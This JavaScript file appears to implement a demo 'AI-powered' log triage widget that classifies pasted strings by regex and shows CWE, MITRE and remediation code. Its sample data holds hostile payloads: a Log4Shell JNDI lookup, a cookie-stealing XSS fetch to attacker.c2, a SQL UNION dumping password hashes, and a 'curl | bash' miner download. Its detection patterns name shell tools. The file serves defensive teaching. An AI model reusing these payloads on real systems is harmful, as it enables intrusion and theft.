// ==========================================
// Elite Feature 3: AI-Powered Threat Intelligence & Log Triage Copilot
// ==========================================

const SAMPLE_LOGS = {
  log4j: "${jndi:ldap://194.26.29.114:1389/ExploitPayload.class}",
  xss: "<script>fetch('http://attacker.c2/steal?cookie='+document.cookie)</script>",
  sqli: "SELECT * FROM users WHERE username = 'admin' AND '1'='1' UNION SELECT 1, password_hash, token FROM auth_tokens--",
  cmdi: "ping -c 1 127.0.0.1; curl -s http://c2.botnet.xyz/miner.sh | bash;",
  lfi: "GET /view.php?page=../../../../etc/passwd HTTP/1.1"
};

class ThreatTriageAI {
  constructor() {}

  init() {
    this.setupListeners();
    this.analyze(SAMPLE_LOGS.log4j);
  }

  setupListeners() {
    const input = document.getElementById("triage-input");
    if (input) {
      input.addEventListener("input", (e) => this.analyze(e.target.value));
    }
  }

  loadPreset(key) {
    const input = document.getElementById("triage-input");
    if (input && SAMPLE_LOGS[key]) {
      input.value = SAMPLE_LOGS[key];
      this.analyze(SAMPLE_LOGS[key]);
    }
  }

  analyze(rawText) {
    if (!rawText || rawText.trim() === "") {
      this.renderEmpty();
      return;
    }

    let threatName = "Generic Anomalous Payload";
    let cwe = "CWE-20: Improper Input Validation";
    let mitre = "T1190 (Exploit Public-Facing Application)";
    let severity = "MEDIUM";
    let riskScore = 65;
    let colorClass = "text-amber-400 border-amber-700 bg-amber-950";
    let mitigationCode = "// Enforce strict input validation whitelist";
    let explanation = "The submitted string exhibits patterns of untrusted user input without explicit strict regex validation.";

    // Pattern Recognition Engine
    if (/jndi:(ldap|rmi|dns)/i.test(rawText)) {
      threatName = "JNDI / Log4Shell Remote Code Execution";
      cwe = "CWE-502: Deserialization of Untrusted Data";
      mitre = "T1190 (Log4j JNDI Lookup Injection)";
      severity = "CRITICAL";
      riskScore = 100;
      colorClass = "text-rose-400 border-rose-700 bg-rose-950";
      explanation = "Payload attempts to trigger outbound JNDI directory service lookups via LDAP/RMI to download and execute arbitrary Java bytecode.";
      mitigationCode = `// JVM Option Hardening:
-Dlog4j2.formatMsgNoLookups=true
// Or upgrade Log4j to >= 2.17.1`;
    } else if (/<script|document\.cookie|javascript:/i.test(rawText)) {
      threatName = "Cross-Site Scripting (XSS) / Session Hijack";
      cwe = "CWE-79: Improper Neutralization of Input During Web Page Generation";
      mitre = "T1059.007 (JavaScript Execution in Browser)";
      severity = "HIGH";
      riskScore = 88;
      colorClass = "text-rose-400 border-rose-700 bg-rose-950";
      explanation = "Attacker is attempting to execute unauthorized JavaScript in the victim's browser context to exfiltrate session cookies and DOM tokens.";
      mitigationCode = `// Secure Sanitization (DOMPurify & CSP Header):
const cleanHTML = DOMPurify.sanitize(untrustedInput);
// Content Security Policy Header:
Content-Security-Policy: default-src 'self'; script-src 'self';`;
    } else if (/UNION(\s+ALL)?\s+SELECT|'OR'1'='1|--|xp_cmdshell/i.test(rawText)) {
      threatName = "SQL Injection (SQLi) / Database Exfiltration";
      cwe = "CWE-89: SQL Injection";
      mitre = "T1190 (SQL Database Command Exploitation)";
      severity = "CRITICAL";
      riskScore = 95;
      colorClass = "text-rose-400 border-rose-700 bg-rose-950";
      explanation = "Payload contains SQL operators designed to escape query syntax, bypass authentication checks, or union unauthorized database records.";
      mitigationCode = `// Parameterized Prepared Statement (Node.js pg/mysql):
const query = "SELECT * FROM users WHERE username = $1 AND pass = $2";
await db.query(query, [userInputUsername, userInputPassword]);`;
    } else if (/;\s*(curl|wget|bash|sh|rm|cat|whoami)|\|\s*bash/i.test(rawText)) {
      threatName = "OS Command Injection / Remote Shell Drop";
      cwe = "CWE-78: Improper Neutralization of Special Elements used in an OS Command";
      mitre = "T1059.004 (Unix Shell Command Execution)";
      severity = "CRITICAL";
      riskScore = 98;
      colorClass = "text-rose-400 border-rose-700 bg-rose-950";
      explanation = "Attacker exploits string concatenation to chain arbitrary operating system shell binaries (curl, bash, rm) with application process privileges.";
      mitigationCode = `// Avoid child_process.exec with concatenated shell strings.
// Use execFile with explicit array argument isolation:
const { execFile } = require('child_process');
execFile('/usr/bin/ping', ['-c', '1', validatedIpAddress]);`;
    } else if (/\.\.\/|\.\.\\|etc\/passwd|win\.ini/i.test(rawText)) {
      threatName = "Path Traversal / Local File Inclusion (LFI)";
      cwe = "CWE-22: Improper Limitation of a Pathname to a Restricted Directory";
      mitre = "T1006 (Direct Volume Access / Arbitrary File Read)";
      severity = "HIGH";
      riskScore = 85;
      colorClass = "text-amber-400 border-amber-700 bg-amber-950";
      explanation = "Path climbing sequence (../) seeks to break out of application root directory to read sensitive host files like /etc/passwd.";
      mitigationCode = `// Path Normalization & Root Confinement:
const safePath = path.normalize(userFileName).replace(/^(\\.\\.[\\/\\\\])+/, '');
const target = path.join('/var/www/uploads', path.basename(safePath));`;
    }

    this.renderResult({
      threatName,
      cwe,
      mitre,
      severity,
      riskScore,
      colorClass,
      mitigationCode,
      explanation
    });
  }

  renderResult(res) {
    const out = document.getElementById("triage-output-container");
    if (!out) return;

    out.innerHTML = `
      <div class="space-y-4 font-mono text-xs">
        <!-- Score Bar -->
        <div class="p-3 bg-slate-950 rounded-xl border border-slate-800 flex items-center justify-between">
          <div>
            <span class="text-slate-500 block text-[10px]">AI RISK SCORE:</span>
            <span class="text-2xl font-bold ${res.riskScore > 80 ? 'text-rose-400' : 'text-amber-400'}">${res.riskScore} / 100</span>
          </div>
          <span class="px-3 py-1 rounded-full text-xs font-bold border ${res.colorClass}">${res.severity}</span>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
          <div class="p-2.5 bg-slate-950 rounded border border-slate-800">
            <span class="text-slate-500 block text-[10px]">CLASSIFICATION:</span>
            <span class="text-white font-bold">${res.threatName}</span>
          </div>
          <div class="p-2.5 bg-slate-950 rounded border border-slate-800">
            <span class="text-slate-500 block text-[10px]">MITRE ATT&CK:</span>
            <span class="text-cyan-400 font-bold">${res.mitre}</span>
          </div>
          <div class="p-2.5 bg-slate-950 rounded border border-slate-800 md:col-span-2">
            <span class="text-slate-500 block text-[10px]">CWE IDENTIFIER:</span>
            <span class="text-slate-200">${res.cwe}</span>
          </div>
        </div>

        <div class="p-3 bg-slate-950 rounded border border-slate-800 text-slate-300">
          <span class="text-slate-500 block text-[10px] mb-1">AI EXPLANATION & MECHANISM:</span>
          ${res.explanation}
        </div>

        <div class="p-3 bg-slate-950 rounded border border-slate-800">
          <span class="text-emerald-400 block text-[10px] font-bold mb-1">RECOMMENDED REMEDIATION CODE:</span>
          <pre class="bg-black/80 p-2.5 rounded text-emerald-300 text-[11px] overflow-x-auto"><code>${res.mitigationCode}</code></pre>
        </div>
      </div>
    `;
  }

  renderEmpty() {
    const out = document.getElementById("triage-output-container");
    if (!out) return;
    out.innerHTML = `
      <div class="p-8 text-center text-slate-500 border border-dashed border-slate-800 rounded-xl font-mono text-xs">
        Type or select a sample malicious payload on the left to run live AI threat triage.
      </div>
    `;
  }
}

window.ThreatTriageAI = new ThreatTriageAI();
